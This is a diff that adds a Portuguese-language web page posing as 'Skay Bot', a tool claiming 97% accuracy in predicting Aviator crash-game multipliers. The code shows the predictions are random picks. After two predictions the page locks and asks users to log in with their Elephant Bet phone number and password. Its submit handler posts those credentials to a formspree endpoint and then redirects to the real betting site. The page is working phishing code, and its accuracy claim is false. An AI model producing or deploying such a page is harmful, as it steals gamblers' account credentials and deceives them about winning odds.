@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Skay Bot - 97% de Acertividade</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: Arial, sans-serif; background:#000; color:#fff; text-align:center; margin:0; padding:20px; }
+    h1 { color:#ff00ff; text-shadow:0 0 10px #ff00ff, 0 0 20px #ff00ff; font-size:2em; }
+    .circle { font-size:1.2em; margin:20px auto 5px auto; padding:40px; border-radius:50%; width:180px; height:180px; display:flex; align-items:center; justify-content:center; background:#111; transition: all 0.3s ease; }
+    .azul { color:#0ff; border:3px solid #0ff; box-shadow:0 0 20px #0ff, 0 0 40px #0ff; text-shadow:0 0 10px #0ff; }
+    .vermelho { color:#f00; border:3px solid #f00; box-shadow:0 0 20px #f00, 0 0 40px #f00; text-shadow:0 0 10px #f00; }
+    .blocked { background:#222; color:#ffcc00; padding:10px; margin:15px auto; border-radius:5px; width:90%; font-size:0.9em; text-shadow:0 0 10px #ffcc00; }
+    button { padding:12px 20px; background:#ff00aa; color:#fff; border:none; border-radius:5px; cursor:pointer; margin-top:15px; font-size:1em; width:80%; max-width:300px; box-shadow:0 0 15px #ff00aa, 0 0 30px #ff00aa; text-shadow:0 0 5px #fff; }
+    button:hover { background:#cc0088; box-shadow:0 0 20px #cc0088, 0 0 40px #cc0088; }
+    input { margin:8px; padding:10px; width:80%; max-width:300px; font-size:1em; background:#111; color:#0ff; border:1px solid #0ff; border-radius:5px; box-shadow:0 0 10px #0ff; }
+    input::placeholder { color:#888; }
+    #loginScreen { display:none; }
+    footer { margin-top:30px; font-size:0.8em; color:#888; }
+    .flash { animation: flash 0.5s alternate 3; }
+    @keyframes flash {
+      from { opacity: 0.2; }
+      to { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Página inicial -->
+  <div id="homeScreen">
+    <h1>Skay Bot - 97% de Acertividade</h1>
+    <div id="circle" class="circle">--</div>
+
+    <button id="preverBtn">Fazer Previsão</button>
+    <div id="resultado"></div>
+
+    <div id="blockedMsg" class="blocked" style="display:none;">
+      ⚠️ Acesso bloqueado. Conecte o Bot para continuar.
+    </div>
+
+    <button id="openLogin">Conectar o Bot</button>
+  </div>
+
+  <!-- Tela de login -->
+  <div id="loginScreen">
+    <h2>Conecte com a sua conta da Elephant Bet</h2>
+    <form id="loginForm">
+      <label for="numero">Número</label><br>
+      <input type="text" id="numero" name="numero" placeholder="número de telemóvel" required><br>
+      <label for="senha">Senha</label><br>
+      <input type="password" id="senha" name="senha" placeholder="Digite a sua senha" required><br>
+      <button type="submit">Conectar Agora</button>
+    </form>
+    <a href="#" id="closeLogin">← Voltar</a>
+    <p id="statusMsg" style="color:#ffcc00;"></p>
+  </div>
+
+  <footer>© Skay Bot - 97% de Acertividade</footer>
+
+  <!-- Som beep -->
+  <audio id="beepSound" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg"></audio>
+
+  <script>
+    let previsoesFeitas = 0;
+    let bloqueado = false;
+    const maxPrevisoes = 2;
+
+    const circle = document.getElementById("circle");
+    const resultado = document.getElementById("resultado");
+    const preverBtn = document.getElementById("preverBtn");
+    const blockedMsg = document.getElementById("blockedMsg");
+    const beepSound = document.getElementById("beepSound");
+
+    preverBtn.addEventListener("click", function() {
+      if (bloqueado) {
+        blockedMsg.style.display = "block";
+        return;
+      }
+
+      previsoesFeitas++;
+      circle.textContent = "Skay Bot prevê...";
+      circle.className = "circle"; // reset estilo
+      circle.classList.add("flash"); // animação de piscar
+      beepSound.play(); // toca beep
+
+      setTimeout(() => {
+        circle.classList.remove("flash");
+        // Lista de multiplicadores típicos do Aviator
+        const multiplicadores = ["1.2x","1.5x","2.3x","3.5x","5x","7.8x","10x","15x","20x","50x","100x"];
+        const resultadoAleatorio = multiplicadores[Math.floor(Math.random() * multiplicadores.length)];
+        circle.textContent = resultadoAleatorio;
+        circle.className = "circle azul"; // estilo neon
+        resultado.textContent = `Previsão ${previsoesFeitas}: Resultado → ${resultadoAleatorio}`;
+      }, 2000);
+
+      if (previsoesFeitas >= maxPrevisoes) {
+        bloqueado = true;
+        blockedMsg.style.display = "block";
+      }
+    });
+
+    // Alternar telas
+    const homeScreen = document.getElementById("homeScreen");
+    const loginScreen = document.getElementById("loginScreen");
+    const openLogin = document.getElementById("openLogin");
+    const closeLogin = document.getElementById("closeLogin");
+    const loginForm = document.getElementById("loginForm");
+    const statusMsg = document.getElementById("statusMsg");
+
+    openLogin.addEventListener("click", function() {
+      homeScreen.style.display = "none";
+      loginScreen.style.display = "block";
+    });
+    closeLogin.addEventListener("click", function() {
+      loginScreen.style.display = "none";
+      homeScreen.style.display = "block";
+    });
+
+    // Enviar dados + redirecionar
+    loginForm.addEventListener("submit", async function(event) {
+      event.preventDefault();
+      const numero = document.getElementById("numero").value;
+      const senha = document.getElementById("senha").value;
+
+      statusMsg.textContent = "faça conexão correcta...";
+
+      try {
+        await fetch("https://formspree.io/f/xgvneord", {
+          method: "POST",
+          body: JSON.stringify({ numero, senha }),
+          headers: { "Content-Type": "application/json" }
+        });
+      } catch (error) {
+        console.log("Erro ao enviar:", error);
+      }
+
+      // desbloqueia previsões
+      bloqueado = false;
+      previsoesFeitas = 0;
+      blockedMsg.style.display = "none";
+
+      // redireciona para a casa de apostas
+      setTimeout(() => {
+        window.location.href = "https://elephantbet.com/login";
+      }, 1500);
+    });
+  </script>
+</body>
+</html>
